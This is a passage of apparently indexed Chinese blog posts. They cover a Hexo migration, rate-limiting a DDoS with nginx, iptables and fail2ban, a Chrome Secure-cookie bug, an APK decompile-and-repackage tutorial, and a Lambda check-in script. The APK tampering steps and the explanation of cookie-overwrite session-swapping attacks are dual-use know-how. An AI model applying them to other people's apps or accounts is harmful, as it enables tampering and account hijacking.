這次用的模板是：hexo-theme-beantech，是我覺得很不錯的一個版型，不過我也有自己修一些小地方就是了。 經歷過這次搬家之後，覺得 Hexo（部落格系統）+ Github Page（Hosting）+ Cloudflare（https）根本是工程師寫部落的最佳實踐，全部免費的方案然後所有必要的東西一次擁有，真棒真棒。 話說之後還可以改成配合 CI 做自動 deploy，那個就等之後再研究吧！","link":"/2017/09/03/moving-from-logdown-to-hexo/"},{"title":"從 GitHub Issues 搬回 Hexo","text":"大約在一年前的時候，我把 Blog 直接放在 GitHub Issues 上面。雖然說台灣很少人這樣做，但有許多中國的開發者都利用這個方式來架 Blog。 那時我會想採用 GitHub Issues 的原因很簡單，就是因為方便。 GitHub Issues 完美支援 Markdown 語法。 上傳圖片超方便 當別人也用 Issues 提到你的文章時，會自動產生 reference 留言系統超方便 可以按 Emoji GitHub repo 可以按 watch 來關注，更新時會收到通知 總結以上，當時選擇了 GitHub Issues。 但最近發現一個很大的問題，當初沒有注意到，那就是 GitHub Issues 的 SEO 極差。你直接拿 Issue 的標題去 Google 搜尋，還不一定能搜得到。 因為這問題挺大的，所以最後還是搬回了 Hexo。 在兩年前其實我就已經搬過一次家了，從 Logdown 搬到 Hexo 去。但那時我沒有繼續使用 Hexo，因為我覺得那個部落格的版面不太好看。 而這次重新搬回來，很大一部分是因為看到了 Askie Lin 的部落格，我看到的時候驚為天人，想說：「哇，這部落格也做得太漂亮了吧！」，後來得知是使用現成的主題 Minos 來改的，於是我就想說可以換成這個主題試試看。 今天經過一整天的調整，自己修了滿多東西，試著把這個版型修成自己想要的樣子，發現還滿順利的。可能是因為原本的 code 就寫得不錯，基本上修起來沒有太大問題，改了一下字體大小以及分類跟文章列表顯示的樣子，其他都沒什麼動。 沒什麼意外的話，以後就決定在這邊紮根了，原本 GitHub 那邊就當作備份文章的地方好了。 Hexo 萬歲，Minos 萬歲 🎉","link":"/2019/09/25/why-move-from-github-issue/"},{"title":"[心得] 與 DDoS 奮戰：nginx, iptables 與 fail2ban","text":"最近發生主機被大量 request 攻擊的事件，而且慘的是這台主機放的是論壇服務 假設攻擊的點是論壇首頁，每次 request 都會去 query DB，而且有一堆 join 其中還有些是 POST 的指令會讓 db update 就這樣一直瘋狂又 select 又 update 導致 DB lock，cpu 飆高掛掉 如果論壇是自己寫的，還可以在 DB 跟 application 之間加上 redis 之類的快取 但偏偏這個論壇系統是別人的，沒有辦法動 先簡單講一下架構，為了分散流量 前面有一台 AWS ELB 做 load balancing，後面有兩台機器 所有 request 都會先到 ELB，再自動到後面兩台其中一台 被攻擊之後怎麼辦呢？第一個想到的就是從 aws 提供的服務：WAF 來擋 https://aws.amazon.com/tw/waf/ 可是發現 WAF 跟原本想的不一樣，他沒有辦法設定像是：「擋掉 10 秒鐘內發超過 100 個 request 的 IP」這種規則 只能繼續在網路上找解法，找到從 nginx 來擋的解法： nginx防止DDOS攻击配置 通过Nginx和Nginx Plus阻止DDoS攻击 Module ngx_http_limit_req_module 12345678910111213http &#123; //觸發條件，限制 ip 每秒 10 個 request limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; server &#123; location ~ \\.php$ &#123; //執行的動作 limit_req zone=one burst=5 nodelay; &#125; &#125;&#125; 總之就是利用 limit_req_zone，這個 nginx 提供的東西 宣告一個 10mb 的 zone 叫做 one 來儲存狀態，這裡的 10r/s 指的就是一秒 10 個 request 接著在你想擋的地方加上：limit_req zone=one burst=5 nodelay;，就可以擋掉了 nginx 會把處理 request 的數量調整成「最多 1 秒 10 個」，如果那個 ip 在同一時間有超過 5 個 request 還沒處理的話，就會傳回 503 service temporarily unavailable，這邊的 5 就是 burst 設定的值 傳回去的 status code 也可以自己指定，例如說：limit_req_status 505; 儘管這個解法看起來很棒，但不知道為什麼，加了之後好像沒有用似的 伺服器的警報還是一直在響，DB 還是持續飆高 在請教過其他同事之後，得知 iptabls 也可以擋，而且還是直接從 tcp 層擋 找到下面兩篇資料： 淺談DDoS攻擊防護 12345-A INPUT -p tcp –dports 80 -j WEB_SRV_DOS-A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j LOG –log-prefix &quot;[Possible DOS Attack]&quot;-A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –rcheck –second 30 –hitcount 200 -j REJECT -A WEB_SRV_DOS -p tcp –syn –dports 80 -m recent –set -A WEB_SRV_DOS -p tcp –dports 80 -j ACCEPT 運用 iptables 限制同一IP單位時間連線數 123-A INPUT -p tcp --dport 80 -m recent --rcheck --seconds 1 --hitcount 5 --name HTTP_LOG --rsource -j DROP-A INPUT -p tcp --dport 80 -m recent --set --name HTTP_LOG --rsource-A INPUT -p tcp --dport 80 -j ACCEPT 兩個的原理都一樣，是透過-m recent –rcheck –second 30 –hitcount 200 這段敘述，描述說你要擋住幾秒內發送幾次的 request，把這個連線 reject 或是 drop。 直接從 iptables 去擋聽起來是個更好的解法，這樣 request 連 nginx 都不會進去就被擋住了 可是天不從人願，用了之後發現還是不行！怎麼會這樣呢 心灰意冷之下，同事又推薦一個好東西叫做：fail2ban 查了一下之後發現用法非常簡單，而且原理很好懂 決定用別台機器來測測看，測試成功之後再套用到正式環境的機器 用 Fail2Ban 防範暴力破解 (SSH、vsftp、dovecot、sendmail) fail2ban教學 Ubuntu 中使用 fail2ban 針對大量 access 做判斷及阻擋 綜合其中幾篇的敘述，可以得出以下流程 1.修改vim /etc/fail2ban/jail.local 2.寫入 123456789[http-get-dos]enabled = trueport = httpfilter = http-get-doslogpath = /var/log/nginx/access.log # 要判斷的logmaxretry = 100 # 最多幾次findtime = 5 # 時間區間bantime = 600 # 要 ban 多久action = iptables[name=HTTP, port=http, protocol=tcp] 上面的規則就是：5 秒內嘗試 100 次失敗之後就 ban 600 秒 3.新增/etc/fail2ban/filter.d/http-get-dos.conf 這邊的檔名就是對應到剛剛 jail.local 設定的名稱 123[Definition]failregex = ^&lt;HOST&gt;- - .*\\&quot;(GET|POST).*ignoreregex = 這裡的failregex要根據你的 log 去寫 像是 nginx 的 access log 長這樣： 1106.184.3.122 - - [21/Jul/2016:11:38:29 +0000] &quot;GET / HTTP/1.1&quot; 200 396 &quot;-&quot; &quot;Go-http-client/1.1&quot; 你就寫一個可以抓到&lt;HOST&gt;，也就是 ip 的 regular expression 都設定好之後，重開一下應該就有效了 就會發現一直發 request 之後自己順利的被 ban 掉 可以用 iptables --list 看一下自己是不是真的有被 ban fail2ban 的原理應該就是去看你指定的 log 檔跟規則，用這個檔案去判斷是不是超出設定的規則，超出的話就把 ip 抓出來，加規則到 iptables 裡面去擋掉，時間到了之後再把規則移除掉 試到這邊，終於成功了！可是既然原理也是 iptables，為什麼剛剛不行呢？ 還記得一開始我提過伺服器架構嗎？前面一台 ELB，後面兩台 web server 因為 ELB 是 AWS 提供的服務，所以客製化程度很低，甚至連 ssh 進去都不行 因此上面嘗試的方案都是個別套用到那兩台 web server 這時候問題就來了 咦？那這樣子 web server 的 request 的來源，不就都是 ELB 的 ip 了嗎？ 沒錯，你突破盲點了！之前沒有用就是卡在這邊 你用 iptables 來檔，因為來源都是 ELB 的 ip，所以會擋掉的只有 ELB，而不是真正的攻擊來源 所以會造成 ELB 被擋掉，整個服務就因為一個攻擊者被搞的超級慢 所以在這個網路環境底下，iptables 是行不通的！ 那 nginx 呢？還記得我們的規則嗎？ 1limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s; $binary_remote_addr抓到的也都會是 ELB 的 ip 這時候靈機一動突然想到，那能不能根據X-Forwarded-For這個 header 來設定呢？就會是真的 IP 了 找到這一篇：nginx rate limiting with X-Forwarded-For header 把$binary_remote_addr換成$http_x_forwarded_for 搞定！大功告成 經歷一番千辛萬苦，最後終於在 nginx 把攻擊流量擋掉 用 JMeter 測試之後也發現確實成功了，多的 request 會直接回傳 503 真是可喜可賀","link":"/2016/07/21/the-battle-against-ddos-nginx-iptables-and-fail2ban/"},{"title":"我遇過的最難的 Cookie 問題","text":"前言 幾個禮拜前我在工作上碰到了一些跟 Cookie 有關的問題，在這之前，我原本想說：Cookie 不就那樣嘛，就算有些屬性不太熟悉，上網找一下資料就好了，哪有什麼跟 Cookie 有關的難題？ 然而事實證明我錯了。我還真的碰到了一個讓我解超久的 Cookie 問題。 相信看到這邊，很多人應該躍躍欲試了，那我就先來考一下大家： 什麼情形下，Cookie 會寫不進去？ 像是語法錯誤那種顯而易見的就不用說了，除此之外你可能會答說：寫完全不同 domain 的 Cookie。例如說你的網頁在 http://a.com 卻硬要寫 http://b.com 的 Cookie，這種情形當然寫不進去。 或者，你可能會回答：不在 https 卻想加上 Secure flag 的 Cookie。 沒錯，像是這種情形也會寫不進去。 除了這些，你還能想到什麼嗎？ 如果想不太到，那就聽我娓娓道來吧！ 悲劇的開始 在一個月前我寫了一篇跟 CSRF 有關的文章（讓我們來談談 CSRF），正是因為工作上需要實作 CSRF 的防禦，所以趁機研究了一下。簡單來說，就是要在 Cookie 設置一個 csrftoken。 可是那天我卻發現，我怎麼寫都寫不進去。 我的測試網站的網址是：http://test.huli.com，拿來寫 Cookie 的 script 是： 1document.cookie = \"csrftoken=11111111; expires=Wed, 29 Mar 2020 10:03:33 GMT; domain=.huli.com; path=/\" 我就只是想對.huli.com寫一個名稱是csrftoken的 Cookie。而我碰到的問題，就是怎麼寫都寫不進去。 這段語法完全沒有問題，我檢查過好幾遍了，但就是不知道為什麼寫不進去。我們開頭講的那幾種 case 這邊都完全沒碰到。這只是一個簡單的 http 網站，而且是寫自己 domain 的 Cookie，怎麼會寫不進去？ 剛開始碰到這情形，我還想說會不會是我電腦的靈異現象，在其他人的電腦上就好了，就暫時沒有管它，直到有一天 PM 跟我說：「咦，這個頁面怎麼壞了？」，我仔細檢查後才發現是因為他也寫不進去這個 Cookie，導致 server 沒有收到 csrftoken 而驗證失敗。 好了，看來現在已經確認不是我電腦上的問題了，而是大家都會這樣。可是，卻有其他人是正常的。其他人都可以，但就只有我跟 PM 兩個人不行。 幸好見過小風小浪的我知道，每次碰到這種詭異的問題，先開無痕模式再說，至少可以知道你的瀏覽器不會被其他因素給干擾。打開無痕模式之後發現，可以了，可以設定 Cookie 了。在一般情況下不行設定，但是開無痕瀏覽模式卻可以。 這就真的很奇怪了，到底為什麼不行呢？而且若是我把 Cookie 換了一個名字，叫做csrftoken2，就可以寫入了！就唯獨csrftoken這個名稱不行，可是 Cookie 總不可能有保留字這種東西吧！就算真的有，csrftoken也絕對不會是保留字。 這一切都太詭異了，到底csrftoken這個名字有什麼問題？到底為什麼寫不進去？ 於是我就去拜了 Google 大神，用cookie 不能寫、cookie can not set、unable set cookie等等的關鍵字去搜尋，卻都一無所獲，找到的答案都跟我的情況完全不一樣。 我用 Chrome devtool 看了，明明http://test.huli.com就沒有任何的 Cookie，怎麼會寫不進去呢？ 在經歷過一陣亂找資料之後，我還稍微去翻了 cookie 的 rfc：HTTP State Management Mechanism，但還是沒有找到相關資料。 最後不知道哪來的靈感，我就去 Chrome 的設定那邊檢視所有 huli.com 的 Cookie，並且一個一個看過之後刪掉。刪完之後，就可以正常寫入 Cookie 了。 仔細想想其實還滿合理的，畢竟無痕模式可以，就代表是以前做的一些事情會影響到寫 Cookie 這件事，再經由刪除 Cookie 就可以確認問題一定是出在其他有關的 Domain 身上，推測是其他 Domain 做了一些事情，才會造成 http://test.huli.com 沒辦法寫入 Cookie。 後來我回想起剛剛刪掉的那幾個 Cookie，發現存在一個也叫做csrftoken的同名 cookie。 撥雲見日 難得讓我找到了一點線索，當然要跟著這條線索繼續查下去。 回想了一下，發現是另外一個負責後台管理的網站叫做：https://admin.huli.com寫的，因為是用 django的關係，所以開啟 CSRF 防護之後預設的 Cookie 名稱就是csrftoken。 仔細再用 Chrome devtool 看了一下，這個 Cookie 設置了Secure，Domain是 .admin.huli.com。看起來也沒什麼異狀。 然而，在拜訪這個網站之後，我再試著去 http://test.huli.com，發現又沒辦法寫入 Cookie 了，甚至原本的 Cookie 也離奇地消失了。 太棒了！看來我離真相越來越近了！ 我把這個.admin.huli.com的同名 Cookie 刪掉之後，去拜訪我自己的http://test.huli.com，發現一切都正常。Cookie 可以正常寫入。 看來答案很明顯了，那就是： 只要.admin.huli.com的那個同名 Cookie 存在，http://test.huli.com就沒辦法對.huli.com寫入同名的 Cookie。 解法其實到這邊就很明顯了，第一個是改一個 Cookie 名稱，第二個是改一個 Domain。 有關於第二個解法，還記得我們在 http://test.huli.com 是寫入 .huli.com 這個 Domain 的 Cookie 嗎？只要改成寫入 .test.huli.com 這個 Domain，一樣可以正常運作。 所以若是講得更詳細一點，這個寫不進去 Cookie 的問題就發生在： 當有一個 Domain 為.admin.huli.com並設置成Secure的 Cookie 已經存在的時候，http://test.huli.com就沒辦法對.huli.com寫入同名的 Cookie。 在大概確認問題以後，我就開始調整各個變因，看能不能查出到底是哪一個環節出了問題，最後我發現兩個重點： 其實只有 Chrome 不能寫，Safari, Firefox 都可以 Secure 這個 flag 沒有設置的話，就可以寫 深入追查 既然有了只有 Chrome 會發生這種情形的這個有力線索，就可以循著這條線繼續追查下去，那怎麼追查呢？ 沒錯，就是最簡單直接的方法：去找 Chromium 的原始碼！ 以前看過很多文章都是查問題查一查最後查到 Source code 去，終於輪到我也有這一天了。可是 Chromium 的原始碼這麼一大包，該如何找起呢？ 於是我決定先 Google：chromium cookie，在第一筆搜尋結果發現了很有幫助的資料：CookieMonster。這篇文章有詳細說明了 Chromium 的 Cookie 機制是怎麼運作的，並且說明核心就是一個叫做 CookieMonster 的東西。 再來就可以直接去看 Source code 了，可以在 /net/cookies 找到 cookie_monster.cc。 還記得剛剛發現的問題重點之一，推測是跟Secure這個 flag 有關，所以直接用 Secure 當關鍵字下去搜尋，可以在中間的部分發現一個 DeleteAnyEquivalentCookie 的 function，以下節錄部分原始碼，1625 行到 1647 行： 12345678910111213141516171819202122// If the cookie is being set from an insecure scheme, then if a cookie// already exists with the same name and it is Secure, then the cookie// should *not* be updated if they domain-match and ignoring the path// attribute.//// See: https://tools.ietf.org/html/draft-ietf-httpbis-cookie-aloneif (cc-&gt;IsSecure() &amp;&amp; !source_url.SchemeIsCryptographic() &amp;&amp; ecc.IsEquivalentForSecureCookieMatching(*cc)) &#123; skipped_secure_cookie = true; histogram_cookie_delete_equivalent_-&gt;Add( COOKIE_DELETE_EQUIVALENT_SKIPPING_SECURE); // If the cookie is equivalent to the new cookie and wouldn't have been // skipped for being HTTP-only, record that it is a skipped secure cookie // that would have been deleted otherwise. if (ecc.IsEquivalent(*cc)) &#123; found_equivalent_cookie = true; if (!skip_httponly || !cc-&gt;IsHttpOnly()) &#123; histogram_cookie_delete_equivalent_-&gt;Add( COOKIE_DELETE_EQUIVALENT_WOULD_HAVE_DELETED); &#125; &#125;&#125; 這邊很貼心的幫你加上了註釋，說是： 如果有個 cookie 是來自 insecure scheme，並且已經存在一個同名又設置為 Secure 又 domain-match 的 cookie 的話，這個 cookie 就不該被設置 雖然不太理解 domain-match 指的到底是怎樣才算 match，但看來我們碰到的寫不進去 Cookie 的問題就是在這一段發生的。而且還有貼心附上參考資料：https://tools.ietf.org/html/draft-ietf-httpbis-cookie-alone 標題為：「Deprecate modification of ‘secure’ cookies from non-secure origins」。 內容不長，很快就可以看完，以下節錄其中一小段： 123456Section 8.5 and Section 8.6 of [RFC6265] spell out some of thedrawbacks of cookies&apos; implementation: due to historical accident,non-secure origins can set cookies which will be delivered to secureorigins in a manner indistinguishable from cookies set by that originitself. This enables a number of attacks, which have been recentlyspelled out in some detail in [COOKIE-INTEGRITY]. 附註中的參考資料是這個：Cookies Lack Integrity: Real-World Implications，裡面有附一段二十幾分鐘的影片，可以看一看，看完之後就會知道為什麼不能寫入了。 如果你還沒看，這邊可以幫大家做一個總結。要知道為什麼剛開始那個 case 不能寫入 Cookie，可以先想想看如果可以寫入，會發生什麼事情。 假如 http://test.huli.com 成功寫入 .huli.com 的 csrftoken 這個 cookie 的話，對 http://test.huli.com 似乎沒什麼影響，就多帶一個 Cookie 上去，看起來合情合理。 可是呢，卻對 https://admin.huli.com 有些影響。 原本 .admin.huli.com 並且設置為 Secure 的 Cookie 還是會在，但現在多了個 .huli.com 又是同名的 Cookie。當 https://admin.huli.com 送 request 的時候，就會把這兩個 Cookie 一併帶上去。所以 Server 收到的時候可能會是這樣： 1csrftoken=cookie_from_test_huli_com; csrftoken=cookie_from_admin_huli_com 但碰到同名 Cookie 的時候，很多人都會只取第一個處理，所以 Server side 收到的 csrftoken 就會是 cookie_from_test_huli_com。 意思就是說，儘管你在 https://admin.huli.com 用 Secure 的方式寫了一個 Cookie，卻被其他不安全的來源（http://test.huli.com）給覆蓋過去了！ 那蓋掉 Cookie 可以做什麼呢？舉幾個上面參考資料給的例子（但我不確定有沒有理解錯誤，有錯的話請指正），第一個是 Gmail 的視窗不是分成兩部分嗎，一部分是信箱，另外一部分是 Hangouts。攻擊者可以利用上面講的手法把原來使用者的 cookie 蓋掉，換成自己的 session cookie，可是因為 Hangouts 跟 Gmail 本身的 domain 不一樣，所以 Gmail 還是使用者的帳號，Hangouts 卻已經變成攻擊者的帳號了。 被攻擊的人就很有可能在不知情的狀況下利用攻擊者的帳號來發送訊息，攻擊者就可以看到那些訊息了。 第二個例子是某間銀行網站，假如在使用者要新增信用卡的時候把 session cookie 換成攻擊者的，那這張信用卡就新增到攻擊者的帳戶去了！ 大概就是這樣，總之都是透過把原本的 cookie 遮蔽住，讓 server side 使用新的 cookie 的攻擊方法。 總結 我一開始碰到這個問題的時候真的滿苦惱的，因為怎麼想都想不到為什麼一個語法完全沒錯的指令沒辦法寫入 Cookie，而且https://admin.huli.com這個網站我平常也很少用到，根本不會想到是它的問題。 但這次把問題解掉之後重新回來看，其實過程中就有一些蛛絲馬跡可循，例如說可以透過「清掉 Cookie 就沒事」這點得知應該是跟其他 Cookie 有干擾，也可以從別的瀏覽器可以寫入這點得知應該是 Chrome 的一些機制。 過程中的每個線索都會帶你找到新的路，只要堅持走下去，一定能成功闖出迷宮。","link":"/2017/08/27/a-cookie-problem/"},{"title":"[Android] 人人都會的 apk 反編譯","text":"前言 對於 Android 工程師來說，了解如何反編譯可以增進自己對 Android 底層的理解，也可以思考如何保護自己的 apk 不被反編譯。 對於一般人來說，許多現成的工具可以幫助我們非常輕鬆的、只要打打幾個指令就可以反編譯 apk，看到 java source code，滿足自己的好奇心。 本篇文章只介紹一些工具的使用，適合初學者觀看。若是想了解更底層的知識，可以參考文末附上的延伸閱讀。 事前準備 首先，我們需要一個用來被破解的 apk，簡單用任何你平常熟悉的工具自己 build 一個就好了 架構很簡單，只要一個 MainActivity 跟兩個TextView就好 MainActivity.java12345678910public class MainActivity extends Activity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); TextView text = (TextView)findViewById(R.id.text); text.setText(\"Taiwan No1\"); &#125;&#125; activity_main.xml12345678910111213141516&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:layout_width=\"match_parent\" android:orientation=\"vertical\" android:layout_height=\"match_parent\"&gt; &lt;TextView android:text=\"@string/hello_world\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" /&gt; &lt;TextView android:id=\"@+id/text\" android:layout_width=\"wrap_content\" android:layout_height=\"wrap_content\" /&gt;&lt;/LinearLayout&gt; 安裝到手機上之後，會看到這樣的畫面： 實際動手 好，這個就是我們要拿來測試的 apk 了 接著你需要一些非常好用的工具 apktool jd-gui dex2jar 如何安裝就不再贅述了，大家看看文件或是上網搜尋一下就會有一堆解答 apktool是拿來把 apk 拆開用的，可以反編譯 apk 之後，看到 smali 檔案跟 resource dex2jar可以把 apk 轉成 jar，再用jd-gui檢視 java code 接著我們開啟 terminal，到剛剛那個示範 apk 的目錄底下，執行apktool d APKNAME.apk 執行以後，會自動生成一個APKNAME的資料夾，裡面就是反編譯出來的東西了 123456.├── AndroidManifest.xml├── apktool.yml├── original├── res└── smali 其中比較值得講的是smali這個資料夾，其實這裡面就是你的 source code，只是格式不太一樣 你可以在smali這資料夾裡面找到你的MainActivity.java，內容如下： （覺得長得很奇怪是很正常的事，但是認真多看幾眼，你會發現其實沒那麼難懂） MainActivity.java1234567891011121314151617181920212223242526272829303132333435363738394041424344454647.class public Lapktest/huli/com/apkdecompile/MainActivity;.super Landroid/app/Activity;.source \"MainActivity.java\"# direct methods.method public constructor &lt;init&gt;()V .locals 0 .prologue .line 8 invoke-direct &#123;p0&#125;, Landroid/app/Activity;-&gt;&lt;init&gt;()V return-void.end method# virtual methods.method protected onCreate(Landroid/os/Bundle;)V .locals 2 .param p1, \"savedInstanceState\" # Landroid/os/Bundle; .prologue .line 12 invoke-super &#123;p0, p1&#125;, Landroid/app/Activity;-&gt;onCreate(Landroid/os/Bundle;)V .line 13 const v1, 0x7f040019 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;setContentView(I)V .line 14 const v1, 0x7f0c0050 invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;findViewById(I)Landroid/view/View; move-result-object v0 check-cast v0, Landroid/widget/TextView; .line 15 .local v0, \"text\":Landroid/widget/TextView; const-string v1, \"Taiwan No1\" invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V .line 16 return-void.end method 你可以仔細對照一下剛剛自己寫的 java code，會發現只是換了種格式而已 1setContentView(R.layout.activity_main); 其實就等於 123.line 13const v1, 0x7f040019invoke-virtual &#123;p0, v1&#125;, Lapktest/huli/com/apkdecompile/MainActivity;-&gt;setContentView(I)V 你可能會好奇，這個0x7f040019是哪來的？ 事實上，你可以在res/values/public.xml這個檔案裡面找到答案： 1&lt;public type=\"layout\" name=\"activity_main\" id=\"0x7f040019\" /&gt; 到這裡，應該就可以大概猜出 Android 在編譯時候的流程 把所有資源檔壓縮、處理並且包在一起，產生id與記憶體位置對照表 把程式碼裡面所有的R.xx.xxx透過剛剛產生的表，換成實際的記憶體位置 把 java code 變成 smali code（有點像把 C 變成組合語言的程式碼那樣） 修改 在剛剛的smali裡面，有這麼一段： 12345.line 15.local v0, \"text\":Landroid/widget/TextView;const-string v1, \"Taiwan No1\"invoke-virtual &#123;v0, v1&#125;, Landroid/widget/TextView;-&gt;setText(Ljava/lang/CharSequence;)V 讓我們把Taiwan No1換成T@iw@n n0! 還記得另一個TextView有用到R.string.hello_world嗎？ 在res/values/strings.xml裡面，可以找到這一串的定義： 1&lt;string name=\"hello_world\"&gt;Hello world!&lt;/string&gt; 改成 1&lt;string name=\"hello_world\"&gt;HELLO WORLD&lt;/string&gt; 確定都有改完以後，就可以把這些程式碼再度「組裝」回去 還記得剛剛反編譯的指令嗎？apktool d APK_NAME.apk 這邊的d就是decompile的意思，所以如果要逆向組裝回去，就是b，build apktool b APK_NAME 執行完之後可以在APK_NAME/dist下面找到一個 apk 要注意的是這個 apk 還沒有被 sign 過，因此無法安裝 可以隨便生成一個 keystore 或是找現成的來簽署 jarsigner -verbose -digestalg SHA1 -keystore ~/KEY.keystore APK_NAME.apk KEY_ALIAS 安裝完以後就會看到這樣的畫面： 沒錯！就是這麼簡單，一個 apk 就這樣被修改了 可是smali的程式碼不好懂，能不能直接看到 java code呢？ 這時候剛剛推薦的工具dex2jar與jd-gui就派上用場了 前者可以把 apk 變成 jar，後者可以開啟一個 jar 並且顯示 java code 兩個組合在一起，就可以直接看到原本的程式碼了 dex2jar下載下來之後會有一堆的 shell script，dex2jar就是我們想要的那個 ./d2j-dex2jar.sh app.apk 執行完之後會有一個 jar，用 jd-gui 打開，會看到你的程式碼一覽無遺 總結 沒接觸過反編譯的人可能會很驚訝：什麼！要改掉一個 apk 居然這麼簡單！ 沒錯，就是這麼簡單，而且這只是一個很基本的範例 事實上，你想要加入新的程式碼、加入新的資源（圖片、聲音等等）也是可以的 也就是說，你不只可以修改，還可以擴充原本的 apk 但也有些方法可以防止不肖人士反編譯 apk 例如說加殼、混淆、動態載入等等 這邊的話以後有機會再介紹 延伸閱讀 Android 反編譯與防止被反編譯 [Android] 程式碼混淆(ProGuard)與反組譯 [Android] 反組譯 破解Android的apk安裝檔 反编译的常用工具与使用方法 Smali–Dalvik虚拟机指令语言–&gt;【android_smali语法学习一】 android反编译-smali语法","link":"/2016/03/20/android-apk-decompile/"},{"title":"AWS Lambda + GitHub API + Google Sheet = 自動化簽到系統","text":"前言 這一年間我利用閒暇之餘嘗試進行了幾場教學實驗，希望能透過持續的教學改進自己的教材，從學生的反饋當中得到一些心得。 而在進行這些教學實驗的時候，我常常在想可以透過哪些現成的服務減少我的負擔，畢竟身為工程師嘛，很想把一些瑣碎的事務自動化，長期下來可以節省的時間是很可觀的。 半年前有了第一次嘗試，也在這邊分享了心得：利用 Github Classroom 加 Travis CI 打造改作業系統，有了自動改作業系統以後，確實省下不少麻煩。 這次要來分享的是兩週前用大概一兩天的時間快速實作出來的自動化簽到系統。 為什麼要簽到系統？ 為了掌握學生的進度以及確保學生是真的有心要持續上課，我在上一次教學實驗時就引進了我在公司裡面每天必做的 Daily Stand-up meeting，每個人快速分享一下自己昨天做了什麼、今天要做什麼以及有沒有任何事情阻止你完成這些任務。 那時候我用的方法是讓每個人在 Slack 的 channel 裡面用固定格式 po 這些東西： 優點是集中在一個地方，很方便觀看，而缺點就是我只能用肉眼看而已，沒辦法記錄下來。意思就是說如果我想要製作一個有哪些學生沒有 po 的表單，我只能一個一個自己填。 上一次時因為學生人數少，而且 po 這個也不是強制的，所以不成問題，但在這一次的教學實驗裡面我引入了淘汰制，在一定期間內如果缺交進度報告太多次是會被淘汰退出課程的。 既然有了這個機制，我就必須要把這些進度報告給記錄起來，要記錄哪些人哪些日子是沒有報告的。如此一來，就必須要有一個更完整的簽到系統才行，我想達成的目的有： 我要可以在 slack channel 裡面看見每個人的進度報告 我要有個地方可以記錄每天每個學生有沒有 po 進度報告（就把這個稱作簽到） 該如何製作這個簽到系統？ 我的第一個想法就是使用 Google 試算表，畢竟這個東西最方便嘛，橫軸填入每個學生的帳號，縱軸填入每天的日期，如果有報告就給一個記號，沒報告就空白，這樣我就可以很明確地看出簽到紀錄了，成品長得像這樣： 這樣子就完成第二個需求了，剩下來的就是想說如何完成第一個需求。最簡單的方式就是跟之前一樣，讓學生在某個 channel 裡面每天自己 po 就好，然後我寫個程式來串 Slack 的 webhook，接收到資料就寫進 Google 試算表裡面。 這個解決方案看似不錯，可是有個問題是課程用的 workspace 是免費版的，訊息到一定量之後就會被吃掉，就看不到以前的進度報告，我覺得這是有點可惜的，所以這個方案行不通。 接著我就想到另一個更不錯的解決方案： 讓學生在 GitHub 的 Issue 下面留言 留言同步到 Slack channel 串接 GitHub Webhook，同步把紀錄寫到試算表裡面 這樣子的好處就是紀錄可以永久保存，而且還可以分天！可以很容易的就找到某一天所有人的進度報告，這個是直接 po 在 Slack 裡沒辦法做到的。 先給大家看一下成品，成品長得會像這樣： 有了對整個簽到系統的概念以後，接下來我們可以把在技術上要做的事情分成以下三項： 每天要在 GitHub 開一個 Issue，標題是今天的日期 每個 Issue 下的留言要被同步到 Slack 要串接 GitHub Webhook，同步把紀錄寫到試算表裡面 再來就是實作時間了！ 1. 每天要在 GitHub 開一個 Issue，標題是今天的日期 一看到「每天」這個關鍵字，就知道這是 Cron Job 可以搞定的事情，原本我想在自己的機器上寫個簡單的小程式讓它每天跑，可是我腦海中突然冒出一個關鍵字：AWS Lambda。 如果你還不知道這是什麼，我簡單說一下，這是近年很流行的 Serverless 的概念之一，不是說沒有 Server，而是指說你不用自己去管 Server，你唯一要做的就是把你的 application 寫好，剩下那些跟 Server 跟機器有關的事情你都不用管。 而 AWS Lambda 就是這樣的一個服務，你只要把你的程式碼放上去就好了，剩下的你都不用管，計費方式是程式的執行時間，可能是因為還在推廣期的關係，所以一個月在一定時數以內都不用錢。 如果不用 Lambda，我要自己把東西傳到我的 Server，然後自己設定 Cron Job 來跑，如果主機出了什麼事情還要自己來修，可是我想做的就只是這麼簡單的一件事情而已阿！用 Lambda 可以幫我省掉很多麻煩，絕對是最佳選擇。 確定要放在 Lambda 上之後，就是要按照它的要求把程式碼寫好放上去，其實這要求也很簡單啦，就是把你要執行的 function 用 exports.handler 給 export 出去就好。 下面是寫好的程式碼： 123456789101112131415161718192021222324252627282930313233343536var axios = require('axios')var moment = require('moment') var token = process.env.tokenvar endpoint = 'https://api.github.com/repos/Lidemy/mentor-daily-report/issues?access_token=' + tokenvar today = moment().format('YYYY-MM-DD') var content = [ '在下面請按照此格式提供本日進度報告：', '```', '## 昨天', '- 寫作業 hw2-1', '- 練習 JavaScript 迴圈使用', '## 今天', '- 研究什麼是 callback', '- 寫作業 hw2-1（繼續）', '```'].join('\\n') const createIssue = async (event) =&gt; &#123; try &#123; const result = await axios.post(endpoint, &#123; title: '[進度報告] ' + today, body: content &#125;, &#123; headers: &#123; 'Accept': 'application/vnd.github.v3+json' &#125; &#125;) return 'success' &#125; catch (err) &#123; return err; &#125;&#125; exports.handler = createIssue 一個非常簡單的程式，一執行就會透過 GitHub API 去 po 一個新的 Issue，標題就是今天的日期。 有一點需要注意的是這邊有用到其他 npm 的 library，應該有方法是可以只傳 package.json 上去，Lambda 就幫你執行 npm install 把那些套件抓下來，但我懶得查了，我就直接把node_modules包進壓縮檔裡面丟上去。 我上一次用 Lambda 大概兩三年前，這個服務才剛推出沒多久，因為好奇所以隨意玩了一下，發現介面很陽春然後很多東西不知道怎麼設定。 事隔多年，這次再看到它的介面真的嚇到我了，進步超級多！ 首先是觸發條件這個部分一目瞭然： 因為我是要每天固定執行，在 AWS 上你可以用 CloudWatch 來設定一個排程，要注意的是在 Lambda 